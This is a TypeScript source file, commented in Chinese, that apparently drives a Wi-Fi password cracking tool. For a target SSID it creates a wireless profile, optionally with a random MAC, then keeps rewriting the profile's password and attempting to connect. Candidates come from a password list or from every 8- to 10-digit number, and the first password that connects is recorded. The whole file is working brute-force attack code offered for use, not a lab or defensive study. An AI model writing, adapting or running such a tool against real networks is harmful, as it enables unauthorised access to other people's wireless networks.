import composeWlanProfile from "./composeWlanProfile"

class CrackTaskManager
{
    /**
     * 网卡任务管理器。
     **/
    wlan_cards: Record<string, WlanCardCrackTaskManager> = {}
    /**
     * 本实例初始化时间。
     **/
    itime: number = 0

    constructor()
    {
        // 
    }

    /**
     * 初始化网卡任务管理器。
     * @param wlan_cards 网卡名称列表。
     */
    initialize(wlan_cards: string[])
    {
        this.itime = Date.now()

        for (const wlan_card of wlan_cards)
        {
            store_Tasks.uncompleted[wlan_card] = []
            this.wlan_cards[wlan_card] = new WlanCardCrackTaskManager(wlan_card)
        }
    }
}

class WlanCardCrackTaskManager
{
    /**
     * 网卡名称。
     */
    private wlan_card: string
    /**
     * 配置文件位置。
     */
    private profile_path: string = ''

    /**
     * 当前正在执行的任务的 Timeout id。
     */
    running_task_timer: undefined | number = undefined

    constructor(wlan_card: string)
    {
        this.wlan_card = wlan_card
    }

    /**
     * 添加一些任务。
     * @param tasks 任务们。
     */
    add(tasks: WC.CrackTask[])
    {
        const queue_task = store_Tasks.uncompleted[this.wlan_card]
        
        queue_task.unshift(...tasks)
    }

    /**
     * 开始任务。（如果该网卡下没有任务正在被执行，则开始队列中的第一个）
     */
    start()
    {
        const queue_task = store_Tasks.uncompleted[this.wlan_card]

        if (queue_task.length && !queue_task.some((task) => (task.status === 'running')))
        {
            this.run(queue_task[0])
        }
    }

    /**
     * 执行一个任务。这将会暂停当前正在执行的任务（如果当前执行任务等同于传入的任务）。
     * @param task 任务。
     */
    run(task: WC.CrackTask): void
    /**
     * 执行一个任务。这将会暂停当前正在执行的任务（如果当前执行任务等同于传入的任务）。
     * @param task_id 任务 ID。
     */
    run(task_id: string): void
    /**
     * 执行一个任务。这将会暂停当前正在执行的任务（如果当前执行任务等同于传入的任务）。
     * @param task_index 任务索引。
     */
    run(task_index: number): void
    async run(arg1: WC.CrackTask | string | number)
    {
        let task: null | WC.CrackTask = null
        const queue_task = store_Tasks.uncompleted[this.wlan_card]
        
        if (typeof arg1 === 'string') task = queue_task.find((task) => (task.id === arg1))!
        else if (typeof arg1 ==='number') task = queue_task[arg1]
        else task = arg1

        const current_running_task = queue_task.find((task) => (task.status === 'running'))

        if(current_running_task && current_running_task.id !== task.id) current_running_task.status = 'pending'
        
        task.status = 'running'
        console.log('task :', task);
        
        // 将任务移到队列首位 //
        // const _index = index ?? queue_task.findIndex((task) => (task.id === task.id))
        // ;[queue_task[_index], queue_task[0]] = [queue_task[0], queue_task[_index]]

        // return;
        // 开始执行任务 //
        const wlan_info = JSON.parse(task.wlan_info) as WC.WlanSSInfoNormalized
        const profile_path = await invoke('create_wlan_profile', {
            wlan_card: this.wlan_card,
            name: wlan_info._SSID,
            content: composeWlanProfile({
                ssid: wlan_info._SSID,
                authentication: wlan_info.Authentication,
                random_mac: task.setup.random_mac,
            })
        })

        this.profile_path = profile_path

        this.iterateAttempt(task)
    }

    pause(task: WC.CrackTask): void
    pause(task_id: string): void
    pause(task_index: number): void
    pause(arg1: WC.CrackTask | string | number)
    {
        let task: null | WC.CrackTask = null
        const queue_task = store_Tasks.uncompleted[this.wlan_card]
        
        if (typeof arg1 === 'string') task = queue_task.find((task) => (task.id === arg1))!
        else if (typeof arg1 ==='number') task = queue_task[arg1]
        else task = arg1

        /**
         * 修改任务状态。
         * 取消下一次的推进迭代的回调执行。
         */
        task.status = 'pending'

        if (this.running_task_timer !== undefined)
        {
            window.clearTimeout(this.running_task_timer)
            this.running_task_timer = undefined
            this.profile_path = ''
        }
    }

    delete(queue_class: 'uncompleted' | 'completed', task: WC.CrackTask): void
    delete(queue_class: 'uncompleted' | 'completed', task_id: string): void
    delete(queue_class: 'uncompleted' | 'completed', task_index: number): void
    delete(queue_class: 'uncompleted' | 'completed', arg1: WC.CrackTask | string | number)
    {
        let task: null | WC.CrackTask = null
        const queue_task = {
            'uncompleted': store_Tasks.uncompleted[this.wlan_card],
            'completed': store_Tasks.completed,
        }[queue_class]

        if (typeof arg1 === 'string') task = queue_task.find((task) => (task.id === arg1))!
        else if (typeof arg1 ==='number') task = queue_task[arg1]
        else task = arg1

        this.pause(task)

        const task_index = queue_task.findIndex((item) => item.id === task.id)
        queue_task.splice(task_index, 1)

        // queue_task = store_Tasks.uncompleted[this.wlan_card].filter((_task) => (_task.id !== task.id))
    }

    /**
     * 注意令迭代尝试只在当前任务为执行态时调用。
     * @param task 
     * @returns 
     */
    async iterateAttempt(task: WC.CrackTask)
    {
        // console.log('iterateAttempt');
        /**
         * 检查是否已完成全部迭代。
         * 已完成则标记任务为完成，执行完成逻辑：
         *     修改任务状态。
         *     将任务移入已完成队列。
         *     清理任务相关（profile 文件，profile 注册）。
         *     开始下一个任务（如果有）。
         * 未完成则继续下方逻辑。
         */
        const { progress } = task

        const last_iteration_group = progress.iteration_groups.at(-1)!
        const [_, last_cursor, last_total] = last_iteration_group

        if (last_cursor === last_total)
        {
            task.status = 'completed'

            store_Tasks.completed.push(task)
            store_Tasks.uncompleted[this.wlan_card] = store_Tasks.uncompleted[this.wlan_card].filter((_task) => (_task.id !== task.id))

            await invoke('remove_wlan_profile_registration', {
                wlan_card: this.wlan_card,
                profile_name: task.ssid,
            })

            await invoke('delete_wlan_profile', {
                wlan_card: this.wlan_card,
                name: task.ssid,
            })

            this.profile_path = ''

            this.start()

            return
        }

        /**
         * 获取当前进度。
         */
        const [strategy, cursor, total] = progress.iteration_groups[progress.stage]

        /**
         * 按任务记录的进度向 profile 改写密码。
         */
        let password = ''

        try {
            password = getIterationPassword(strategy, cursor)
        } catch (error) {
            console.error(error)
            return
        }

        await invoke('rewrite_wlan_profile_password', {
            wlan_card: this.wlan_card,
            profile_name: task.ssid,
            password: password,
        })

        await invoke('add_wlan_profile_registration', {
            wlan_card: this.wlan_card,
            profile_path: this.profile_path,
        })

        /**
         * 连接 WLAN。
         */
        try {
            await invoke('connect_wlan', {
                profile_name: task.ssid,
                wlan_card: task.setup.device,
            })
        } catch (error) {
            /**
             * 如果网络请求失败。
             *     记录失败日志。
             *     不推进进度。
             *     执行一个新的迭代尝试。
             *     结束本次迭代尝试。
             */
            task.log.failures.push([Date.now(), String(error)])

            if (task.status === 'running') this.iterateAttempt(task)

            return
        }

        /**
         * 在给定的等待时间后，检查是否连接成功。
         *     检查网卡连接状态以确定是否连接成功。
         */
        const checked_connection_status = await new Promise<boolean>((resolve) => {
            window.setTimeout(async () => {
                /**
                 * @TODO 优化：令网卡连接检查以一个固定间隔轮询，直到确定网卡已连接状态。（确定状态：{connected, disconnected}，不确定状态：{None, associating}）
                 * 因为网卡在连接进行中时状态是 associating，（目前使用用户设置的链接间隔）连接间隔过短则可能错过连接，连接间隔过长则可能浪费时间。
                 */
                const if_connected = await invoke ('check_wlan_connection', {
                    wlan_card: task.setup.device,
                    ssid: task.ssid,
                })
                resolve(if_connected)
            }, task.setup.connection_interval * 1000)
        })

        /**
         * 连接成功且可以确定此次尝试的结果，推进进度。
         */
        progress.iteration_groups[progress.stage][1]++
        if (cursor === total) progress.stage++

        /**
         * 如果尝试成功，执行任务完成清理逻辑。
         *     标记任务为完成。
         *     记录密码。
         *     将任务移入已完成队列。
         */
        if (checked_connection_status)
        {
            task.status = 'completed'

            store_Tasks.completed.push(task)
            store_Tasks.uncompleted[this.wlan_card] = store_Tasks.uncompleted[this.wlan_card].filter((_task) => (_task.id !== task.id))

            await invoke('remove_wlan_profile_registration', {
                wlan_card: this.wlan_card,
                profile_name: task.ssid,
            })

            await invoke('delete_wlan_profile', {
                wlan_card: this.wlan_card,
                name: task.ssid,
            })

            this.profile_path = ''

            task.result = {
                ctime: Date.now(),
                password: password,
            }
        }
        /**
         * 如果尝试失败，执行一个新的迭代尝试。
         */
        else
        {
            if (task.status === 'running') this.iterateAttempt(task)
        }
    }
}

export default new CrackTaskManager()










/**
 * 获取当次迭代的密码。
 */
function getIterationPassword(strategy: WC.CrackStrategy, cursor: number)
{
    if (strategy === 'passwordbook')
    {
        return store.passwordbook_list[cursor]
    }
    else if (['digits_8', 'digits_9', 'digits_10'].includes(strategy))
    {
        const order = Number(strategy.replace('digits_', '')) - 1
        let cursor_number = cursor
        let derived_digits = ''

        for (let i = order; i >= 0; i--)
        {
            const digit = Math.floor(cursor_number / (Math.pow(10, i)))
            cursor_number %= Math.pow(10, i)
            derived_digits += digit
        }
        
        console.log('derived_digits :', derived_digits);
        return derived_digits
    }

    throw new Error('Unsupported strategy.')
}